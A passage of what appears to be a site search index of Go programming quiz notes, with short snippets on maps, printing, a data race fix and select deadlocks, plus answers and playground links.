style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003emap\u003c/span\u003e[\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e] = \u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tprintln(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/OM5SjB_pob2\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e0 1\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Map"},{"categories":null,"contents":" print package main import \u0026#34;fmt\u0026#34; type T struct { x int } func (t T) String() string { return \u0026#34;boo\u0026#34; } func main() { t := T{123} fmt.Printf(\u0026#34;%v\\n\u0026#34;, t) fmt.Printf(\u0026#34;%#v\\n\u0026#34;, t) } Answer Try it boo main.T{x:123} print1 package main import ( \u0026#34;fmt\u0026#34; ) func f(a ...int) { fmt.Printf(\u0026#34;%#v\\n\u0026#34;, a) } func main() { f() } Answer Try it []int(nil) ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/questions/print/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eprint\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e { \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;boo\u0026#34;\u003c/span\u003e }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e123\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%v\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%#v\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/hwt8G32Bfy5\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003eboo\nmain.T{x:123}\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eprint1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e...\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%#v\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/uCBzdeAxFE6\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e[]int(nil)\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Print"},{"categories":null,"contents":" race type Stats struct { mutex sync.Mutex counters map[string]int } func (s *Stats) Snapshot() map[string]int { s.mutex.Lock() defer s.mutex.Unlock() return s.counters } func (s *Stats) Add(name string, num int) { s.mutex.Lock() defer s.mutex.Unlock() s.counters[name] = num } Answer func (s *Stats) Snapshot() map[string]int { s.mutex.Lock() defer s.mutex.Unlock() result := make(map[string]int, len(s.counters)) for k, v := range s.counters { result[k] = v } return result } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/questions/race/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003erace\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eStats\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003emutex\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esync\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMutex\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ecounters\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003emap\u003c/span\u003e[\u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eStats\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eSnapshot\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003emap\u003c/span\u003e[\u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003emutex\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eLock\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003emutex\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUnlock\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ecounters\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eStats\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eAdd\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ename\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003enum\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003emutex\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eLock\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003emutex\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUnlock\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ecounters\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003ename\u003c/span\u003e] = \u003cspan style=\"color:#a6e22e\"\u003enum\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\n\u003ccode class=\"language-golang\"\u003efunc (s *Stats) Snapshot() map[string]int {\n\ts.mutex.Lock()\n\tdefer s.mutex.Unlock()\n\tresult := make(map[string]int, len(s.counters))\n\tfor k, v := range s.counters {\n\t\tresult[k] = v\n\t}\n\treturn result\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Race"},{"categories":null,"contents":" select package main import \u0026#34;sync\u0026#34; func main() { var wg sync.WaitGroup foo := make(chan int) bar := make(chan int) wg.Add(1) go func() { defer wg.Done() select { case foo \u0026lt;- \u0026lt;-bar: default: println(\u0026#34;default\u0026#34;) } }() wg.Wait() } Answer Try it fatal error: all goroutines are asleep - deadlock! select1 package main import \u0026#34;fmt\u0026#34; func main() { ch1 := make(chan int) ch2 := make(chan int) go func() { ch1 \u0026lt;- 1 }() go func() { select { case \u0026lt;-ch1: case ch2 \u0026lt;- 2: } }() fmt.Println(\u0026lt;-ch2) } A. 1 B. 2 C. No output, program is deadlocked D. No output, program has finished execution. E. else Answer Try it B ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/questions/select/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eselect\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;sync\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewg\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esync\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWaitGroup\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efoo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003echan\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ebar\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003echan\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ewg\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eAdd\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewg\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eDone\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eselect\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efoo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ebar\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003edefault\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\tprintln(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;default\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ewg\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWait\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/kF4pOjYXbXf\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003efatal error: all goroutines are asleep - deadlock!\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eselect1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ech1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003echan\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ech2\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003echan\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003ech1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eselect\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e 